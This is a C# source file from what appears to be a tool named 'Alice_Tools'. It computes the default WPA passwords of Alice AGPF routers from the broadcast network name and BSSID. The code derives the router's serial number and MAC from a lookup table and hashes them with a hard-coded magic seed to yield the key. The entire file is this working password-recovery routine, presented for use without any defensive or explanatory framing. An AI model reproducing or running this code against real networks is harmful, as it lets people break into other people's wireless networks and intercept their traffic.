using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Alice_Tools
{
    class AGPF_PSK
    {
        public static SByte computeHi(string m)
        {
            m = "0" + m.Replace(":", "").Substring(5, 7);
            UInt64 m2 = UInt64.Parse(m, NumberStyles.HexNumber, CultureInfo.CurrentCulture.NumberFormat);
            m2 = (m2 * 0x55E63B89) >> 57;
            return (SByte)m2;
        }

        public static Byte[] computeMac(string s, string b)
        {
            Alice_Tools.Utils U = new Alice_Tools.Utils();

            string essid = s.Substring(6, 8);
            sbyte hi = 0;

            if (!b.Equals("void") && ((hi = computeHi(b)) > 0))
            {
                essid = hi + essid;
            }

            try
            {
                using (StreamReader sr = new StreamReader(@".\config.txt"))
                {
                    string line;
                    string[] row;

                    while ((line = sr.ReadLine()) != null)
                    {
                        row = line.Split(',');
                        if ((essid.StartsWith(row[0])) && (Convert.ToUInt32(row[3]) <= Convert.ToUInt32(essid)))
                        {
                            Byte[] mac = U.strToByteArray((row[4].Remove(5) + U.strToHex(essid)));
                            return mac;
                        }
                        if ((essid.StartsWith(row[0].Remove(2))) && (Convert.ToUInt32(row[3]) <= Convert.ToUInt32(essid)))
                        {
                            Byte[] mac = U.strToByteArray((row[4].Remove(5) + U.strToHex(essid)));
                            return mac;
                        }
                    }
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }

            return null;
        }

        private static List<string> computeSn(string s)
        {
            Alice_Tools.Utils U = new Alice_Tools.Utils();

            List<string> slist = new List<string>();

            string essid = s.Substring(6, 8);
            string serial;
            try
            {
                using (StreamReader sr = new StreamReader(@".\config.txt"))
                {
                    string line;
                    string[] row;

                    while ((line = sr.ReadLine()) != null)
                    {
                        row = line.Split(',');
                        if ((essid.StartsWith(row[0])) && (Convert.ToUInt32(row[3]) <= Convert.ToUInt32(essid)))
                        {
                            serial = row[1] + "X" + (((Convert.ToUInt32(essid) - Convert.ToUInt32(row[3])) / Convert.ToUInt32(row[2])).ToString()).PadLeft(7, '0');
                            slist.Add(serial);
                        }
                        if ((essid.StartsWith(row[0].Remove(2))) && (Convert.ToUInt32(row[3]) <= Convert.ToUInt32(essid)))
                        {
                            serial = row[2] + "X" + (((Convert.ToUInt32(essid) - Convert.ToUInt32(row[3])) / Convert.ToUInt32(row[2])).ToString()).PadLeft(7, '0');
                            slist.Add(serial);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }

            if (slist.Count == 0)
                return null;

            return slist;
        }

        public static string computePSK(byte[] mac, string serial)
        {
            Alice_Tools.Utils U = new Alice_Tools.Utils();

            Byte[] magic = {
                    0x64, 0xC6, 0xDD, 0xE3, 0xE5,
                    0x79, 0xB6, 0xD9, 0x86, 0x96,
                    0x8D, 0x34, 0x45, 0xD2, 0x3B,
                    0x15, 0xCA, 0xAF, 0x12, 0x84,
                    0x02, 0xAC, 0x56, 0x00, 0x05,
                    0xCE, 0x20, 0x75, 0x91, 0x3F,
                    0xDC, 0xE8
            };

            Char[] table = {
                    '0', '1', '2', '3', '4', '5',
                    '6', '7', '8', '9',
                    'a', 'b', 'c', 'd', 'e', 'f',
                    'g', 'h', 'i', 'j', 'k', 'l',
                    'm', 'n', 'o', 'p', 'q', 'r',
                    's', 't', 'u', 'v', 'w', 'x',
                    'y', 'z'
            };

            List<byte> data = new List<byte>();
            data.AddRange(magic);
            data.AddRange(U.strToByte(serial));
            data.AddRange(mac);

            SHA256 sha = new SHA256Managed();
            Byte[] hash = sha.ComputeHash(data.ToArray());
            int index = 0;
            StringBuilder sb = new StringBuilder ();
            for (int i = 0; i < 24; i++)
            {
                index = hash[i];
                sb.Append(table[index % 36]);
            }

            return sb.ToString();
        }

        public static string[] getPSK(string essid, string bssid)
        {
            Alice_Tools.Utils U = new Alice_Tools.Utils();

            Byte[] mac = computeMac(essid, bssid);
            List<string> sn = computeSn(essid);
            List<string> psk = new List<string>();

            if (sn != null)
            {
                foreach (string serial in sn)
                {
                    psk.Add(computePSK(mac, serial));
                }
            }
            else
            {
                psk.Add("Q for " + essid + " wasn't found in config.txt.\r\ncan't compute psk.");
            }

            return psk.Distinct().ToArray();
        }
    }
}
